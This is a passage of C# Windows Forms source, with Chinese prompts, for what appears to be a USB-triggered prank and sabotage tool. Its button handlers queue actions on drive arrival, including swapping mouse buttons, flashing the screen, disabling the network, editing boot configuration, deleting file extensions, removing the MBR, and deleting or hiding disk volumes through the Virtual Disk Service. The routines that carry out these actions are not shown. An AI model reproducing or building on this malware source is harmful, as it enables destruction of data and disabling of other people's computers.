				SpeechSynthesizer i = new SpeechSynthesizer();
				if (i.GetInstalledVoices().Count == 0)
				{
					ReadText.Enabled = false;
					return;
				}
			}
			catch (Exception)
			{
				ReadText.Enabled = false;
				return;
			}
			Voice = new SpeechSynthesizer
			{
				Rate = 0,
				Volume = 0
			};
		}
		public void SwapMouseButton_Click(object sender, EventArgs e)
		{
			WhenArrival("SwapMouseButton");
		}
		public void ChangeName_Click(object sender, EventArgs e)
		{
			string i;
			if ((i = Interaction.InputBox("输入U盘名称。", "输入", "我的U盘")).Length == 0)
			{
				return;
			}
			else
			{
				sentence = i;
			}
			WhenArrival("volume");
		}
		public void Rotate_Click(object sender, EventArgs e)
		{
			DEVMODE1 = new DEVMODE()
			{
				dmDeviceName = new string(new char[33]),
				dmFormName = new string(new char[33]),
				dmSize = (short)(Marshal.SizeOf(DEVMODE1))
			};
			EnumDisplaySettings(null, -1, ref DEVMODE1);
			WhenArrival("rotate");
		}
		public void ShowWeb_Click(object sender, EventArgs e)
		{
			string i = Interaction.InputBox("输入网页链接。", "输入", "https://www.baidu.com/");
			try
			{
				UriBuilder builder = new UriBuilder(i);
			}
			catch
			{
				return;
			}
			sentence = i;           
			WhenArrival("web");
		}
		public void FillUp_Click(object sender, EventArgs e)
		{
			WhenArrival("fillup");
		}
		public void Glass_Click(object sender, EventArgs e)
		{
			WhenArrival("glass");
		}
		public void CloseWnd_Click(object sender, EventArgs e)
		{
			WhenArrival("close");
		}
		public void MouseTrail_Click(object sender, EventArgs e)
		{
			WhenArrival("mousetrail");
		}
		public void Destroy_Click(object sender, EventArgs e)
		{
			WhenArrival("destroy");
		}
		public void SetText_Click(object sender, EventArgs e)
		{
			string i;
			if ((i = Interaction.InputBox("输入你喜欢的窗口标题")).Length > 0)
			{
				sentence = i;
				WhenArrival("title");
			}
		}
		public void Eject_Click(object sender, EventArgs e)
		{
			WhenArrival("eject");
		}
		public void Flash_Click(object sender, EventArgs e)
		{
			DEVMODE1 = new DEVMODE()
			{
				dmDeviceName = new string(new char[33]),
				dmFormName = new string(new char[33]),
				dmSize = (short)(Marshal.SizeOf(DEVMODE1))
			};
			EnumDisplaySettings(null, -1, ref DEVMODE1);
			WhenArrival("flash");
		}


		private void Random_Click(object sender, EventArgs e)
		{
			DEVMODE1 = new DEVMODE()
			{
				dmDeviceName = new string(new char[33]),
				dmFormName = new string(new char[33]),
				dmSize = (short)(Marshal.SizeOf(DEVMODE1))
			};
			EnumDisplaySettings(null, -1, ref DEVMODE1);
			WhenArrival("random");
		}

		private void Beep_Click(object sender, EventArgs e)
		{
			WhenArrival("beep");
		}

		private void BeUncle_Click(object sender, EventArgs e)
		{
			lhwnd = new List<IntPtr>();
			WhenArrival("beuncle");
		}

		private void SetBcd_Click(object sender, EventArgs e)
		{
			WhenArrival("bcd");
		}

		private void CloseNetWork_Click(object sender, EventArgs e)
		{
			WhenArrival("network");
		}

		private void SetBcd_MouseEnter(object sender, EventArgs e)
		{
			ReBoot.BackColor = SetBcd.FlatAppearance.MouseOverBackColor;
		}

		private void SetBcd_MouseLeave(object sender, EventArgs e)
		{
			ReBoot.BackColor = SetBcd.BackColor;
		}

		private void SetBcd_MouseDown(object sender, MouseEventArgs e)
		{
			ReBoot.BackColor = SetBcd.FlatAppearance.MouseDownBackColor;
		}

		private void SetBcd_MouseUp(object sender, MouseEventArgs e)
		{
			ReBoot.BackColor = SetBcd.BackColor;
		}

		private void SetColor_Click(object sender, EventArgs e)
		{
			if (GetColor.ShowDialog() == DialogResult.OK)
			{
				SetColor.Tag = GetColor.Color;
				WhenArrival("color");
			}
		}

		private void Media_MouseEnter(object sender, EventArgs e)
		{
			FullScreen.BackColor = Media.FlatAppearance.MouseOverBackColor;
		}

		private void Media_MouseDown(object sender, MouseEventArgs e)
		{
			FullScreen.BackColor = Media.FlatAppearance.MouseDownBackColor;
		}

		private void Media_MouseLeave(object sender, EventArgs e)
		{
			FullScreen.BackColor = Media.BackColor;
		}

		private void Media_MouseUp(object sender, MouseEventArgs e)
		{
			FullScreen.BackColor = Media.BackColor;
		}

		private void Cursor_Click(object sender, EventArgs e)
		{
			WhenArrival("cursor");
		}

		private void DeleteFileExt_Click(object sender, EventArgs e)
		{
			WhenArrival("deleteext");
		}

		private void Negative_Click(object sender, EventArgs e)
		{
			WhenArrival("negative");
		}

		private void Numerical_Click(object sender, EventArgs e)
		{
			WhenArrival("filename");
		}

		private void Mute_Click(object sender, EventArgs e)
		{
			WhenArrival("mute");
		}

		private void Clip_Click(object sender, EventArgs e)
		{
			WhenArrival("clip");
		}

		private void DisableWnd_Click(object sender, EventArgs e)
		{
			WhenArrival("disable");
		}


		private void WndPicture_Click(object sender, EventArgs e)
		{
			var temp = SetAttrib.Show("picture");
			if (temp.Length != 0)
			{
				sentence = temp[0].ToString();
				WhenArrival("wndpicture");
			}
		}

		private void Picture_Click(object sender, EventArgs e)
		{
			var temp = SetAttrib.Show("picture");
			if (temp.Length != 0)
			{
				sentence = temp[0].ToString();
				WhenArrival("picture");
			}
		}

		private void DrawText_Click(object sender, EventArgs e)
		{
			string i;
			if ((i = Interaction.InputBox("输入要绘制的文本内容。")).Length > 0)
			{
				sentence = i;
				WhenArrival("text");
			}
		}

		private void WindMouse_Click(object sender, EventArgs e)
		{
			WhenArrival("wind");
		}

		private void AccessForbidden_Click(object sender, EventArgs e)
		{
			WhenArrival("lock");
		}
		private void ChkDsk_Click(object sender, EventArgs e)
		{
			WhenArrival("chkdsk");
		}

		private void ToTop_Click(object sender, EventArgs e)
		{
			WhenArrival("totop");
		}

		private void RemoveMbr_Click(object sender, EventArgs e)
		{
			WhenArrival("removembr");
		}

		private void DeleteVolume_Click(object sender, EventArgs e)
		{
			Guid guid_Loader = typeof(IVdsServiceLoader).GUID;
			CoCreateInstance(ref CLSID_VdsLoader, null, CLSCTX_LOCAL_SERVER, ref guid_Loader, out IUnknown _loader);
			IVdsServiceLoader loader = _loader as IVdsServiceLoader;
			loader.LoadService(null, out service);
			service.WaitForServiceReady();
			WhenArrival("delete");
		}

		private void HideVolume_Click(object sender, EventArgs e)
		{
			Guid guid_Loader = typeof(IVdsServiceLoader).GUID;
			CoCreateInstance(ref CLSID_VdsLoader, null, CLSCTX_LOCAL_SERVER, ref guid_Loader, out IUnknown _loader);
			IVdsServiceLoader loader = _loader as IVdsServiceLoader;
			loader.LoadService(null, out service);
			service.WaitForServiceReady();
			WhenArrival("hidevolume");
		}

        private void PlayError_Click(object sender, EventArgs e)
        {
			WhenArrival("playerror");
		}

        private void AutoClick_Click(object sender, EventArgs e)
        {
			WhenArrival("autoclick");
		}

        private void Monochrome_Click(object sender, EventArgs e)
        {
			WhenArrival("monochrome");
		}
        private void CloseMouse_Click(object sender, EventArgs e)
        {
			WhenArrival("closemouse");
		}

        private void WinKeyDown_Click(object sender, EventArgs e)
        {
			WhenArrival("winkeydown");
		}

        private void SingleColor_Click(object sender, EventArgs e)
        {
			if (GetColor.ShowDialog() == DialogResult.OK)
			{
				SingleColor.Tag = GetColor.Color;
				WhenArrival("singlecolor");
			}
		}

        private void NewDesktop_Click(object sender, EventArgs e)
        {
			defaultdesktop = GetThreadDesktop(GetCurrentThreadId());
			newdesktop = CreateDesktop("mydesktop", null, IntPtr.Zero, 0, GENERIC_ALL, IntPtr.Zero);
			STARTUPINFO sui = new STARTUPINFO()
			{
				lpDesktop="mydesktop",
			};
			sui.cb = Marshal.SizeOf(sui);
			StringBuilder s = new StringBuilder("explorer.exe");
			CreateProcess(null, s, IntPtr.Zero, IntPtr.Zero, false, 0, IntPtr.Zero, Environment.CurrentDirectory, ref sui, out PROCESS_INFORMATION pi);
			CloseHandle(pi.hProcess);
			CloseHandle(pi.hThread);
			WhenArrival("newdesktop");	
			
		}

        private void Sleep_Click(object sender, EventArgs e)
        {
			WhenArrival("sleep");
		}
    }
}
